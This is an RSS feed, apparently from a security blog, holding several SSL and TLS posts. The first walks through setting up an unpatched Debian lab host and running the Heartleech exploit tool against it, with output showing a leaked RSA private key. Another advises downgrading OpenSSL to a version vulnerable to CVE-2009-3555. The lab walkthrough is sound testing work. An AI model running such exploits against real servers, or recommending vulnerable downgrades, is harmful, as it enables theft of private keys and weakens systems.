@@ -1,0 +1,360 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>SSL &#8211; Phocean.net</title>
+	<atom:link href="/blog-archive/tag/ssl/feed" rel="self" type="application/rss+xml" />
+	<link>/blog-archive</link>
+	<description>Computer Security Blog</description>
+	<lastBuildDate>Fri, 24 Feb 2017 21:17:51 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>hourly</sy:updatePeriod>
+	<sy:updateFrequency>1</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=4.9.10</generator>
+	<item>
+		<title>Testing Heartbleed vulnerability</title>
+		<link>/blog-archive/2014/07/14/testing-heartbleed-vulnerability.html</link>
+		<pubDate>Mon, 14 Jul 2014 21:48:23 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[Pentesting]]></category>
+		<category><![CDATA[Security]]></category>
+		<category><![CDATA[Debian]]></category>
+		<category><![CDATA[heartbleed]]></category>
+		<category><![CDATA[pentest]]></category>
+		<category><![CDATA[SSL]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=1995</guid>
+		<description><![CDATA[No fresh news, but I had been wanting to test the Heartbleed vulnerability for a while and just missed time. I used the following quick setup: Debian 7.0 virtual machine as a vulnerable host Heartleech tool. There are many other tools around, but this one was suggested to me by a coworker, who used it successfully during a...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2014/07/14/testing-heartbleed-vulnerability.html">Continue Reading</a></span>]]></description>
+				<content:encoded><![CDATA[<p>No fresh news, but I had been wanting to test the Heartbleed vulnerability for a while and just missed time.</p>
+<p>I used the following quick setup:</p>
+<ol>
+<li><strong>Debian 7.0</strong> virtual machine as a vulnerable host</li>
+<li><a href="https://github.com/robertdavidgraham/heartleech">Heartleech</a> tool. There are many other tools around, but this one was suggested to me by a coworker, who used it successfully during a pentest.</li>
+</ol>
+<p>Getting a vulnerable host in your own environment is not that trivial, as most OS have now been patched (including the installation ISO of supported versions).</p>
+<p>In my quest, I ended up with Debian 7.0 (Debian 6.x are too old and actually do not suffer from the vulnerability).</p>
+<p>To download an old and unpatched installation image of Debian, you need to use <em><strong>Jigdo</strong></em>. This tool will download all packages from the archive site of Debian and rebuild the ISO:</p>
+<pre>jigdo-lite ftp://cdimage.debian.org/cdimage/archive/7.0.0/i386/jigdo-dvd/debian-7.0.0-i386-DVD-1.jigdo</pre>
+<p>Then, create a virtual machine with no network card, to make sure that the installation process does not retrieve any patch.</p>
+<p>Once the Debian virtual machine is set and running:</p>
+<ol>
+<li>Edit &lt;code&gt;/etc/apt/source.list&lt;/code&gt; to comment out lines concerning security updates (keep only the DVD enabled)</li>
+<li>Add and configure a network card (&lt;code&gt;eth0&lt;/code&gt;)</li>
+<li>Install <em><strong>Apache2</strong></em></li>
+<li>Enable SSL: <code>a2enmod ssl</code></li>
+<li>Enable the default SSL web pages: &lt;code&gt;e2ensite default-ssl&lt;/code&gt;</li>
+<li>Open a browser to check that it all works at &lt;code&gt;https://hostname&lt;/code&gt;</li>
+</ol>
+<p>Using heartleech is incredibly fast and straightforward:</p>
+<pre>heartleech % ./heartleech 172.25.254.153 --autopwn
+--- heartleech/1.0.0i ---
+https://github.com/robertdavidgraham/heartleech
+786648 bytes downloaded (6.293-mbps)
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEA40dv2FdGVHxQRydIyZixnNwnez6bFMyQu+AAjpFmphA39Lzr
+4rW8ca8uY0W34jeHx+qTNABkrmfOeZpTFbpCnU7ZDRy8J/KUoq6o26vdkg98fT/t
+VqlBPLEp6uD0bazvNp4H5KGO3f1c06y8uBjc4/hOPgiCYYi3aPQpV8ybHqkcdA4K
+ps6u9EYvXHwInUwXwOg13OynpYfsxJt2PSF/qoaz7zbU0ie7wMJFFFmXEMwT0uUX
+[...]
+ko+g0mrTttbz6egHRs3JFmV3oucnGCrTq/Z4Ivcsqdt059UhspDFxMPoesyUjMQs
+o8KZF5q2adNTxyoaQPiln9H9GjDSSKt448G9YM7CM7cAd7JkvFBdEjrRsP+4W92B
+3EPn1yMCgYEA+LARBdzOfFasv4/UWub85QersrT35hNneTrtaVTBiJR0v7jdXnqe
+k0aoHJV/D73j2hW3mGaC9JsnUMfZ3AkoDhfojZzqp2jOlaFNWZr80NDERekJrRTT
+3JVFVF33NAW3OWY97/52XRZzcGJTDx9fx8R3guS4tR5O/ETgdREPmAw=
+-----END RSA PRIVATE KEY-----</pre>
+<p>You can also dump the memory in a file:</p>
+<pre>./heartleech 172.25.254.153 --cert /tmp/debian --read /tmp/test</pre>
+<p>To further look for interesting content with <code>strings</code> or any parsing tool (<em>Yara</em>?) of your choice.</p>
+<p>It gives also an alternative method to retrieve the private key. First, download the public key from your browser to a file and apply it to the dump to look for the matching private key:</p>
+<pre>./heartleech 172.25.254.153 --cert /tmp/debian --read /tmp/test
+--- heartleech/1.0.0i ---
+https://github.com/robertdavidgraham/heartleech
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEA40dv2FdGVHxQRydIyZixnNwnez6bFMyQu+AAjpFmphA39Lzr
+4rW8ca8uY0W34jeHx+qTNABkrmfOeZpTFbpCnU7ZDRy8J/KUoq6o26vdkg98fT/t
+VqlBPLEp6uD0bazvNp4H5KGO3f1c06y8uBjc4/hOPgiCYYi3aPQpV8ybHqkcdA4K
+ps6u9EYvXHwInUwXwOg13OynpYfsxJt2PSF/qoaz7zbU0ie7wMJFFFmXEMwT0uUX
+[...]
+ko+g0mrTttbz6egHRs3JFmV3oucnGCrTq/Z4Ivcsqdt059UhspDFxMPoesyUjMQs
+o8KZF5q2adNTxyoaQPiln9H9GjDSSKt448G9YM7CM7cAd7JkvFBdEjrRsP+4W92B
+3EPn1yMCgYEA+LARBdzOfFasv4/UWub85QersrT35hNneTrtaVTBiJR0v7jdXnqe
+k0aoHJV/D73j2hW3mGaC9JsnUMfZ3AkoDhfojZzqp2jOlaFNWZr80NDERekJrRTT
+3JVFVF33NAW3OWY97/52XRZzcGJTDx9fx8R3guS4tR5O/ETgdREPmAw=
+-----END RSA PRIVATE KEY-----</pre>
+<p>Neat!</p>
+<p>You may check <a href="https://www.digitalocean.com/community/tutorials/how-to-protect-your-server-against-the-heartbleed-openssl-vulnerability">this page</a> to get information on vulnerable versions and remediation.</p>
+]]></content:encoded>
+			</item>
+		<item>
+		<title>CVE-2009-3555: Safari, fix reached Mountain Lion&#8230;</title>
+		<link>/blog-archive/2012/08/13/cve-2009-3555-safari-fix-reached-mountain-lion.html</link>
+		<pubDate>Mon, 13 Aug 2012 17:53:15 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[Mac OS]]></category>
+		<category><![CDATA[System]]></category>
+		<category><![CDATA[Apple]]></category>
+		<category><![CDATA[cve]]></category>
+		<category><![CDATA[CVE-2009-3555]]></category>
+		<category><![CDATA[Safari]]></category>
+		<category><![CDATA[SSL]]></category>
+		<category><![CDATA[TLS]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=1348</guid>
+		<description><![CDATA[I haven&#8217;t investigated much (and I will not more), but since my upgrade to Mac OS 10.8 (Mountain Lion), Safari supports safe renegociation. Meanwhile, I had received a laconic answer from Apple to my bug report saying that they &#8220;are aware of this issue&#8221;. Note that Safari 6.0 on Lion did not (at least on my...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2012/08/13/cve-2009-3555-safari-fix-reached-mountain-lion.html">Continue Reading</a></span>]]></description>
+				<content:encoded><![CDATA[<p>I haven&#8217;t investigated much (and I will not more), but since my upgrade to Mac OS 10.8 (Mountain Lion), Safari supports safe renegociation.</p>
+<p>Meanwhile, I had received a laconic answer from Apple to my bug report saying that they &#8220;are aware of this issue&#8221;.</p>
+<p>Note that Safari 6.0 on Lion <a href="/blog-archive/2012/06/10/cve-2009-3555-safari-not-yet-patched.html">did not</a> (at least on my computer, if someone could confirm)&#8230; so same browser version, different OS, the system SSL library must have been &#8211; silently &#8211; updated.</p>
+<p>Anyway, good move finally.</p>
+]]></content:encoded>
+			</item>
+		<item>
+		<title>CVE-2009-3555: Safari not yet patched ???</title>
+		<link>/blog-archive/2012/06/10/cve-2009-3555-safari-not-yet-patched.html</link>
+		<pubDate>Sun, 10 Jun 2012 18:17:59 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[Mac OS]]></category>
+		<category><![CDATA[Security]]></category>
+		<category><![CDATA[Vulnerabilities]]></category>
+		<category><![CDATA[browser]]></category>
+		<category><![CDATA[chrome]]></category>
+		<category><![CDATA[cve]]></category>
+		<category><![CDATA[CVE-2009-3555]]></category>
+		<category><![CDATA[firefox]]></category>
+		<category><![CDATA[IE]]></category>
+		<category><![CDATA[Opera]]></category>
+		<category><![CDATA[Safari]]></category>
+		<category><![CDATA[SSL]]></category>
+		<category><![CDATA[TLS]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=1249</guid>
+		<description><![CDATA[The other day I was shocked to find this entry in my Apache logs: [error] SSL Library Error: 336068931 error:14080143:SSL routines:SSL3_ACCEPT:unsafe legacy renegotiation disabled It occurs appears when I try to use a SSL client certificate with Safari. Of course, authentication is broken as it just fails on an 403 error page. So it seems...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2012/06/10/cve-2009-3555-safari-not-yet-patched.html">Continue Reading</a></span>]]></description>
+				<content:encoded><![CDATA[<p>The other day I was shocked to find this entry in my Apache logs:</p>
+<pre>[error] SSL Library Error: 336068931 error:14080143:SSL routines:SSL3_ACCEPT:unsafe legacy renegotiation disabled</pre>
+<p>It occurs appears when I try to use a SSL client certificate with Safari. Of course, authentication is broken as it just fails on an 403 error page.</p>
+<p>So it seems that Safari is the last browser which was not patched against <a href="/blog-archive/2009/11/28/openssl-cve-2009-3555-security-fix-and-mod_ssl-client-authentication-breakage.html">CVE-2009-3555</a> !</p>
+<p>2009 !! At least, I quickly checked the other browsers I had around and they were fine: IE, Firefox, Chrome&#8230; I am having an issue with Opera also, but although I have not identified the problem yet, it seems unrelated (and does not throw the same error).</p>
+<p>Note that I reported the issue to Apple, but I did not receive any answer. Silence on the wire.</p>
+]]></content:encoded>
+			</item>
+		<item>
+		<title>Cloud in the security sky or should I see a psychologist?</title>
+		<link>/blog-archive/2011/02/05/cloud-in-the-security-sky-or-should-i-see-a-psychologist.html</link>
+		<pubDate>Sat, 05 Feb 2011 18:22:45 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[Defense]]></category>
+		<category><![CDATA[Security]]></category>
+		<category><![CDATA[browser]]></category>
+		<category><![CDATA[cloud]]></category>
+		<category><![CDATA[CSRF]]></category>
+		<category><![CDATA[SSL]]></category>
+		<category><![CDATA[XSS]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=1010</guid>
+		<description><![CDATA[The &#8220;cloud&#8221; is a buzz word that has been around for months. The marketing guys are pushing it so hard that every IT guy will hear of that at work soon or later. Taking a decision whether to use it or not requires some deep knowledge, because if its pros are clear &#8211; you can...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2011/02/05/cloud-in-the-security-sky-or-should-i-see-a-psychologist.html">Continue Reading</a></span>]]></description>
+				<content:encoded><![CDATA[<p>The &#8220;cloud&#8221; is a buzz word that has been around for months. The marketing guys are pushing it so hard that every IT guy will hear of that at work soon or later.</p>
+<p>Taking a decision whether to use it or not requires some deep knowledge, because if its pros are clear &#8211; you can count on the salesmen to get a great picture of it again and again, its cons are silenced.</p>
+<p>Too bad, a major disadvantage is security. But guess what? The other day an &#8220;analyst&#8221; presenting his study about cloud computing just cleared out the issue in 3 words :</p>
+<blockquote><p>&#8220;Concerning the people who doubt of the security in the cloud, it is a typical psychological issue of theses persons fearing change or something new . There is really nothing concrete to worry about cloud security.&#8221;</p></blockquote>
+<p>Well, not sure I am going to see a psychologist. Of course the guy did not give any solid argument, so here we go.</p>
+<p>In short, cloud computing expose to the Internet services that were, in normal conditions, always kept inside an internal network and behind peripheral protections.</p>
+<p>Of course, these services offer authentication, but basically almost every traditional web attacks will work as usual. After all, we are talking about the same web portal, the same users, the same browsers, etc.</p>
+<p>Let quickly summarize the potential threats: CSRF, XSS, phishing, SSL attacks (MiTM, certificate spoofing),  browser exploits and many more.</p>
+<p>So really, it is not a question of being crazy, paranoid or reluctant to change. There are just many issues that don&#8217;t make the cloud useless but should incite to caution.</p>
+<p>Cloud computing can be used for what it is good at (flexibility, convenience) but not to replace a datacenter. It should not be used if security is a concern.</p>
+<p>Don&#8217;t listen to the salesman only, read what some specialists are saying. Here is a compilation of some interesting articles I found :</p>
+<ul>
+<li>Black Hat 2009 presentation : <a title="BackHat 2009 and cloud computing" href="http://www.isecpartners.com/storage/docs/presentations/Cloud-BlackHat-2009-iSEC.pdf">pdf</a> and <a title="black hat could models" href="http://www.cupfighter.net/index.php/2009/07/blackhat-talk-cloud-computing-models-and-vulnerabilities-raining-on-the-trendy-new-paradise-by-alex-stamos-andrew-becherer-nathan-wilcox/">summary</a></li>
+<li>Owasp presentation (<a title="Owasp and cloud computing security" href="http://www.owasp.org/images/1/12/Cloudy_with_a_chance_of_0_day_-_Jon_Rose-Tom_Leavey.pdf">pdf</a>)</li>
+<li><a title="dangers in the cloud" href="http://www.webvivant.com/dangers-in-the-cloud.html">Dangers in the cloud </a></li>
+<li><a title="Browsers vulnerabilities" href="http://lcamtuf.blogspot.com/2011/02/so-you-think-your-capability-model-is.html" target="_self">So you think *your* capability model is bad?</a> (browser&#8217;s weak design)</li>
+</ul>
+<p>And last but not least, in case our favorite salesman keeps pushy:</p>
+<ul>
+<li><a title="Amazon EC2 vulnerabilities" href="http://cloudsecurity.org/blog/2008/12/18/whats-new-in-the-amazon-cloud-security-vulnerability-in-amazon-ec2-and-simpledb-fixed-75-months-after-notification.html">Amazon EC2 vulnerabilities</a></li>
+<li><a title="Salesforce phishing incident" href="http://www.ebizq.net/blogs/security_insider/2007/11/implications_of_salesforce_phi.php">Salesforce phishing incident</a></li>
+</ul>
+<p>But that&#8217;s not all. The same goes with &#8220;virtualization everywhere&#8221;, but that will be another topic&#8230;</p>
+]]></content:encoded>
+			</item>
+		<item>
+		<title>Possible use of SSL rogue certificates for spying purposes</title>
+		<link>/blog-archive/2010/04/04/possible-use-of-ssl-rogue-certificate-for-spying-purpose.html</link>
+		<pubDate>Sun, 04 Apr 2010 20:48:48 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[Cryptography]]></category>
+		<category><![CDATA[Security]]></category>
+		<category><![CDATA[MiTM]]></category>
+		<category><![CDATA[rogue certificate]]></category>
+		<category><![CDATA[sniff]]></category>
+		<category><![CDATA[SSL]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=763</guid>
+		<description><![CDATA[Recent work of security researchers on SSL MiTM attacks have shown how fragile the whole Internet security design could be. But whereas some of these attacks concerns CA with insufficient security policies (md5 collisions) or some level of social engineering against the user (sslsniff), this paper alerts us on a more serious and stealth threat....<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2010/04/04/possible-use-of-ssl-rogue-certificate-for-spying-purpose.html">Continue Reading</a></span>]]></description>
+				<content:encoded><![CDATA[<p>Recent work of security researchers on SSL MiTM attacks have shown how fragile the whole Internet security design could be.</p>
+<p>But whereas some of these attacks concerns CA with insufficient security policies (md5 collisions) or some level of social engineering against the user (sslsniff), this <strong><a title="defeating ssl mitm" href="http://files.cloudprivacy.net/ssl-mitm.pdf" target="_blank">paper</a></strong> alerts us on a more serious and stealth threat.</p>
+<p>It explains brilliantly, providing us with real case scenarios, how a CA (probably under the authority of a government agency or a similar powerful organisation) can create a rogue certificate that will be silently trusted by our browsers.</p>
+<p>The problem relies in the chain of trust : a root CA delegates trust to intermediate CA, which can at this point generate any &#8220;valid&#8221; certificate they want, even for a domain they shouldn&#8217;t sign.</p>
+<p>Excerpt :</p>
+<blockquote><p><em>&lt;&lt; As an example, the Israeli government could compel StartCom, an Israeli CA to issue an intermediate CA certiﬁcate that falsely listed the country of the intermediate CA as the United States. This rogue intermediate CA would then be used to issue site certiﬁcates for subsequent surveillance activities. In this hypothetical scenario, let us imagine that the rogue CA issued a certiﬁcate for Bank Of America, whose actual certiﬁcate was issued by VeriSign in the United States. Were CertLock to simply evaluate the issuing CA’s country of the previously seen Bank of America certiﬁcate, and compare it to the issuing country of the rogue intermediate CA (falsely listed as the United States), CertLock would not detect the hijacking attempt. In order to detect such rogue intermediate CAs, a more thorough comparison must be conducted. &gt;&gt;</em></p></blockquote>
+<p>In such a case, no browser will ever send an alert, so even the most experienced and most paranoid users would be easily cheated. It makes it very easy for an agency to conduct a man-in-the-middle attack, sniffing all of the user activity.<br />
+So here is a need for an add-on.</p>
+<p>As a Firefox user, I am using <strong><a title="Certificate Patrol" href="https://addons.mozilla.org/fr/firefox/addon/6415" target="_blank">Certificate Patrol</a></strong>. It basically alerts the user whenever the certificate of a site changes. The inconvenience is that it requires a long learning period and it also generates quite a lot of false positive (when a certificate is renewed, for instance).</p>
+<p style="text-align: center;"><a href="/blog-archive/wp-content/uploads/2010/04/certpatrol.png" rel="lightbox[763]"><img class="aligncenter size-full wp-image-764" title="Certificate Patrol add-on" src="/blog-archive/wp-content/uploads/2010/04/certpatrol.png" alt="" width="394" height="409" /></a></p>
+<p><strong>Adi Shamir</strong> and <strong>Phil Zimmerman</strong>, the author of the paper above, plan to publish a new add-on, <strong>Certlock</strong>. It will check carefully all the chain of trust for a certicate and send out an alert whenever a detail is incoherent, for instance when the country of the parent&#8217;s certificate is different from the country the rogue certificate is pretending to be.</p>
+<p>I really hope Certlock is coming soon.</p>
+]]></content:encoded>
+			</item>
+		<item>
+		<title>SSL/TLS RFC updated against CVE-2009-3555</title>
+		<link>/blog-archive/2010/01/09/ssltls-rfc-updated-against-cve-2009-3555.html</link>
+		<pubDate>Sat, 09 Jan 2010 11:23:09 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[Cryptography]]></category>
+		<category><![CDATA[Linux]]></category>
+		<category><![CDATA[Security]]></category>
+		<category><![CDATA[System]]></category>
+		<category><![CDATA[Apache]]></category>
+		<category><![CDATA[IETF]]></category>
+		<category><![CDATA[mod-ssl]]></category>
+		<category><![CDATA[RFC]]></category>
+		<category><![CDATA[SSL]]></category>
+		<category><![CDATA[TLS]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=673</guid>
+		<description><![CDATA[A solution has been finally brought up to fix CVE-2009-3555 and the temporary solution that broke client authentication. At least, the IETF agreed on a fix as Marsh Ray informs us, though it will still take some weeks for the whole validation process to complete. Moreover, as it requires both the servers and the clients...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2010/01/09/ssltls-rfc-updated-against-cve-2009-3555.html">Continue Reading</a></span>]]></description>
+				<content:encoded><![CDATA[<p>A solution has been finally brought up to fix<a href="/blog-archive/2009/11/28/openssl-cve-2009-3555-security-fix-and-mod_ssl-client-authentication-breakage.html"> CVE-2009-3555 and the temporary solution that broke client authentication</a>.</p>
+<p>At least, the IETF agreed on a fix as <a title="SSL/TLS fix" href="http://extendedsubset.com/?p=14" target="_blank">Marsh Ray</a> informs us, though it will still take some weeks for the whole validation process to complete.</p>
+<p>Moreover, as it requires both the servers and the clients to be patched, it will take months before the patches can be applied and one can have a working client authentification architecture. The longest will be the client side, of course, so I feel sorry for those who have a large park to manage.</p>
+<p>As far as I am concerned, fortunately, I will just have a few browsers that I manage directly to update. Anyway, still more patience is needed !</p>
+]]></content:encoded>
+			</item>
+		<item>
+		<title>OpenSSL : CVE-2009-3555 security fix and mod_ssl client authentication breakage</title>
+		<link>/blog-archive/2009/11/28/openssl-cve-2009-3555-security-fix-and-mod_ssl-client-authentication-breakage.html</link>
+		<comments>/blog-archive/2009/11/28/openssl-cve-2009-3555-security-fix-and-mod_ssl-client-authentication-breakage.html#comments</comments>
+		<pubDate>Sat, 28 Nov 2009 16:08:50 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[Cryptography]]></category>
+		<category><![CDATA[Linux]]></category>
+		<category><![CDATA[Security]]></category>
+		<category><![CDATA[System]]></category>
+		<category><![CDATA[Apache]]></category>
+		<category><![CDATA[Debian]]></category>
+		<category><![CDATA[openSUSE]]></category>
+		<category><![CDATA[SSL]]></category>
+		<category><![CDATA[Vulnerability]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=524</guid>
+		<description><![CDATA[A security advisory on OpenSSL has recently been published. Details are there and there. It is vulnerable to a MiTM attack where the attacker can intercept and retrieve the credential to a trusted HTTPS website, by intercepting the session cookie sent back to the client. A proof of concept of an attack against Twitter was...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2009/11/28/openssl-cve-2009-3555-security-fix-and-mod_ssl-client-authentication-breakage.html">Continue Reading</a></span>]]></description>
+				<content:encoded><![CDATA[<p>A security advisory on OpenSSL has recently been published. Details are <a title="CVE-2009-3555" href="http://secunia.com/advisories/cve_reference/CVE-2009-3555/">there</a> and <a title="renegociation vulnerability" href="http://www.securegoose.org/2009/11/tls-renegotiation-vulnerability-cve.html">there</a>.</p>
+<p>It is vulnerable to a <strong>MiTM attack </strong>where the attacker can intercept and retrieve the credential to a trusted HTTPS website, by intercepting the session cookie sent back to the client.</p>
+<p>A proof of concept of an attack against Twitter was made.</p>
+<p>Fine. But so far, <strong>the answer was to just disable any renegociation</strong>.</p>
+<p>This actually causes some issues with SSL session timeout and totally broke client authentication.</p>
+<p>I got into problems because of the latter. I am using client authentication for some location of my web server, and I recently could not connect anymore to these with the following log in apache :</p>
+<pre>[Tue Nov 24 16:56:15 2009] [debug] ssl_engine_kernel.c(1912): OpenSSL:Exit: error in SSLv3 read client hello A
+[Tue Nov 24 16:56:15 2009] [error] [client x.x.x.x] Re-negotiation handshake failed: Not accepted by client!?</pre>
+<p>I first was not aware of the openssl patch and tried almost anything possible. My focus was, of course, on the certificate and the client.<br />
+But, a nice guy on IRC #suse,<strong> Stittel</strong>, had a good hunch and suggested me to look at the CVE-2009-3555 fix.</p>
+<p>After more tests, it was quickly confirmed to work well with older versions of OpenSSL (as shipped in Debian Lenny).<br />
+Finally, I downgraded the OpenSSL version on my openSUSE box to a version prior to the CVE-2009-3555 fix and it just worked fine.</p>
+<p>Then, I dig into it and found a lot of interesting reports <a href="https://bugzilla.redhat.com/show_bug.cgi?id=533125" target="_blank">there</a> and <a href="http://old.nabble.com/TLS-renegotiation-disabling-:-mod_ssl-and-OpenSSL--0.9.8l-td26285568.html" target="_blank">there</a>. So far it is a real mess.<br />
+In short, the breakage will stay as long as browsers don&#8217;t also include a patch to avoid renegotiation.<br />
+So far, I could not find a browser that does include a patch.<br />
+If anyone reading it knows a version that does it, please let me know.</p>
+<p>Meanwhile, you have actually the choice between :</p>
+<ul>
+<li>low security by deactivating client authentication on your server</li>
+<li>low security by keeping a vulnerable version of OpenSSL</li>
+</ul>
+<p>As my server is not very exposed, I chose the latter, but that&#8217;s not satisfying.  It is not recommended, but if like me you need to use client authentication with mod_ssl on openSUSE 11.2, do :</p>
+<pre>% zypper install --from repo-oss openssl openssl-certs libopenssl0_9_8 libopenssl0_9_8-32bit</pre>
+<p>where repo-oss is the alias to the 11.2 release (without updates) on your system.</p>
+<p>What a brutal way to fix an issues without much notification and consideration to the users ! Even the log message is wrong and just confusing the administrator&#8230;</p>
+<p><em>PS 1 : thanks again to Stittel for the good hint (I hope you will come by here) and to the always nice and helpful #suse channel in general ;)</em></p>
+<p><em>PS 2 : <a href="https://bugzilla.novell.com/show_bug.cgi?id=558176" target="_blank">bug reported</a> on openSUSE bugzilla</em></p>
+]]></content:encoded>
+			<wfw:commentRss>/blog-archive/2009/11/28/openssl-cve-2009-3555-security-fix-and-mod_ssl-client-authentication-breakage.html/feed</wfw:commentRss>
+		<slash:comments>2</slash:comments>
+		</item>
+		<item>
+		<title>MD5 in your SSL certificate ? No need to panic !</title>
+		<link>/blog-archive/2009/01/02/md5-in-your-ssl-certificate-no-need-to-panic.html</link>
+		<comments>/blog-archive/2009/01/02/md5-in-your-ssl-certificate-no-need-to-panic.html#comments</comments>
+		<pubDate>Fri, 02 Jan 2009 19:58:52 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[Cryptography]]></category>
+		<category><![CDATA[Security]]></category>
+		<category><![CDATA[MD5]]></category>
+		<category><![CDATA[MiM]]></category>
+		<category><![CDATA[SHA-1]]></category>
+		<category><![CDATA[SSL]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=316</guid>
+		<description><![CDATA[MD5 was found vulnerable a few years ago. Recently, a team succeeded in producing a fake CA SSL certificate. MD5 or SHA-1 is the algorithm used to authenticate the peer in SSL messages. If it gets compromised, and using various combined technics, it becomes possible to do a MiM attack. But too much noise has...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2009/01/02/md5-in-your-ssl-certificate-no-need-to-panic.html">Continue Reading</a></span>]]></description>
+				<content:encoded><![CDATA[<p><strong>MD5</strong> was found vulnerable a few years ago. Recently, <a title="MD5 : fake CA SSL cert" href="http://www.secuobs.com/news/31122008-md5_pki_cluster_ps3_25c3_certificat.shtml" target="_blank">a team succeeded in producing a fake CA SSL certificate</a>.</p>
+<p><strong>MD5</strong> or <strong>SHA-1</strong> is the algorithm used to authenticate the peer in SSL messages. If it gets compromised, and using various combined technics, it becomes possible to do a <strong>MiM</strong> attack.</p>
+<p>But too much noise has been made about it. There is <a title="MD5" href="http://broadcast.oreilly.com/2009/01/new-pki-problem-resolved.html" target="_blank">a nice reaction</a>.</p>
+<p>Indeed, it still requires a lot of efforts and conditions for the attack to be possible. And the CPU power is still huge : the researchers used not less than a cluster of <strong>200 PS3</strong> to drive the attack. Even with that hardware and engineering, it took until 3 days of intensive computation.</p>
+<p>Not everyone can afford it, nor would have much motivation to attack a single user like this.</p>
+<p>Security has always been a compromise between usuability and risk. Today, the risk concerning MD5 is still low enough to stop this wind of panic.</p>
+<p>Let&#8217;s begin the migration to SHA-1 quietly.</p>
+]]></content:encoded>
+			<wfw:commentRss>/blog-archive/2009/01/02/md5-in-your-ssl-certificate-no-need-to-panic.html/feed</wfw:commentRss>
+		<slash:comments>1</slash:comments>
+		</item>
+		<item>
+		<title>How to stop Firefox from prompting for the client certificate</title>
+		<link>/blog-archive/2008/11/16/how-to-stop-firefox-from-prompting-for-the-client-certificate.html</link>
+		<comments>/blog-archive/2008/11/16/how-to-stop-firefox-from-prompting-for-the-client-certificate.html#comments</comments>
+		<pubDate>Sun, 16 Nov 2008 22:46:33 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[Cryptography]]></category>
+		<category><![CDATA[Security]]></category>
+		<category><![CDATA[Apache]]></category>
+		<category><![CDATA[firefox]]></category>
+		<category><![CDATA[mode-ssl]]></category>
+		<category><![CDATA[SSL]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=303</guid>
+		<description><![CDATA[I am using a client certificate to authenticate against some Apache HTTPS website. By default, Firefox 3 has a very annoying setting : it will prompt you with a box to select your certificate, every time the browser access to a file. I quickly realized that there is not setting in the preference tab to...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2008/11/16/how-to-stop-firefox-from-prompting-for-the-client-certificate.html">Continue Reading</a></span>]]></description>
+				<content:encoded><![CDATA[<p>I am using a client certificate to authenticate against some Apache HTTPS website.</p>
+<p>By default, Firefox 3 has a very annoying setting : it will prompt you with a box to select your certificate, every time the browser access to a file.</p>
+<p>I quickly realized that there is not setting in the preference tab to change this behavior. That sucks, really !</p>
+<p>Fortunately, it is possible to tweak it within the <strong>about:config</strong> page. Set the <strong>security.default_personal_cert entry</strong> with <em><strong>Select Automatically</strong></em> instead of <em><strong>Ask Every Time</strong></em>.</p>
+<p>But what a dumb behavior !</p>
+<p>It is like the alert page that Firefox displays every time a self-signed certificate is used. I am now wondering if the developers really understood well what a certificate is !</p>
+<div id="attachment_304" style="width: 310px" class="wp-caption aligncenter"><a href="/blog-archive/wp-content/uploads/2008/11/capture-1.png" rel="lightbox[303]"><img class="size-medium wp-image-304" title="Setting Firefox properly for Client certificate" src="/blog-archive/wp-content/uploads/2008/11/capture-1.png" alt="Setting Firefox properly for Client certificate" width="300" height="187" /></a><p class="wp-caption-text">Setting Firefox properly for Client certificate</p></div>
+]]></content:encoded>
+			<wfw:commentRss>/blog-archive/2008/11/16/how-to-stop-firefox-from-prompting-for-the-client-certificate.html/feed</wfw:commentRss>
+		<slash:comments>6</slash:comments>
+		</item>
+		<item>
+		<title>SSH/SSL patching and hardening</title>
+		<link>/blog-archive/2008/05/20/sshssl-patching-and-hardening.html</link>
+		<pubDate>Tue, 20 May 2008 21:57:41 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[Security]]></category>
+		<category><![CDATA[SSH]]></category>
+		<category><![CDATA[SSL]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=107</guid>
